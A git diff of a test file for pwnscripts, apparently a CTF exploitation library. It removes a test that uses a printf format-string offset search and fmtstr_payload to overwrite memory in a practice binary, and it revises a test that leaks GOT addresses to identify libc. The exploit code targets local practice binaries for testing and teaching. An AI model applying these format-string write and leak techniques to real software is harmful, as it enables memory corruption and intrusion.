@@ -1,6 +1,9 @@
 '''A number of tests for pwnscripts.
-Some of these test cases are "probabilistic", in that they
-can arbitrarily fail or pass depending on <undetermined factor>.
+This file contains tests that are too unpredictable, too burdensome to automate,
+or otherwise unwanted in the automated tests for specific reasons.
+
+This file also serves to demonstrate some of the features of pwnscripts,
+showing off common use-cases and best practices.
 '''
 import unittest as ut
 from pwnscripts import *
@@ -8,40 +11,9 @@ from pwnscripts import *
 class BinTests(ut.TestCase):
     def test_A_common_sense(self):
         # check base necessities
-        for i in range(1,2): assert not path.isfile('%d.out'%i)
+        for i in [2]: assert not path.isfile('%d.out'%i)
         assert path.isfile('/usr/bin/gcc')
     
-    def test_printf_buffer_bruteforce(self):
-        print()
-        try:
-            system('./examples/1.c')    # compile the program
-            context.log_level = 'warn'
-            context.binary = '1.out'
-            
-            @context.quiet
-            def printf(l: str): # First, a function to abstract C printf() i/o
-                r = context.binary.process()
-                r.sendafter('\n', l)
-                return r.recvline()
-            
-            # Let's say we want to write to s[64]. We first find the printf() offset to s[]:
-            with context.local(log_level='info'):   # show info for testing purposes
-                offset = fsb.find_offset.buffer(printf, maxlen=49)  # maxlen is 50-1 (-1 due to fgets)
-            
-            # Then, make use of pwntools' fmtstr library to write to there:
-            r = context.binary.process()
-            s_addr = extract_first_hex(r.recvline())  #another pwnscripts func
-            payload = fmtstr_payload(offset, {s_addr+56: 0x12345678}, write_size='short')
-            r.sendline(payload)
-            
-            # Finally, grab back the input (and verify that the flag is there)
-            lastline = r.recvall().split(b'\n')[-1]
-            r.close()
-            self.assertEqual(lastline, b'flag{Goodjob}')
-            
-        finally:
-            system('rm 1.out')
-        
     def test_libc_db(self):
         print()
         try:
@@ -69,14 +41,18 @@ class BinTests(ut.TestCase):
             # grab the leaked addresses and pass them to libc_find() for detection
             libc_addrs = map(lambda b:extract_first_bytes(b,6),fsb.leak.deref_extractor(r.recvall()))
             libc_dict = dict(zip(GOT_table, libc_addrs))
-            path_to_libcdb = input("path to libc-database: ").strip()
+            path_to_libcdb = 'libc-database'
+            if not path.isdir(path_to_libcdb):
+                path_to_libcdb = input("path to libc-database: ").strip()
             assert path.isdir(path_to_libcdb)
+            context.libc_database = path_to_libcdb
             with context.local(log_level='info'):   # show info for testing purposes
-                db = libc_find(path_to_libcdb, libc_dict)
+                context.libc = context.libc_database.libc_find(libc_dict)
+                # NOTE: I have no idea how this leaks out into the global context. Danger!
 
             # test the libc id found
             r = process(**proc)
-            r.sendline(db.id)
+            r.sendline(context.libc.id)
             r.recvline()
             self.assertEqual(r.recvline().strip(), b'flag{congrats}')
             
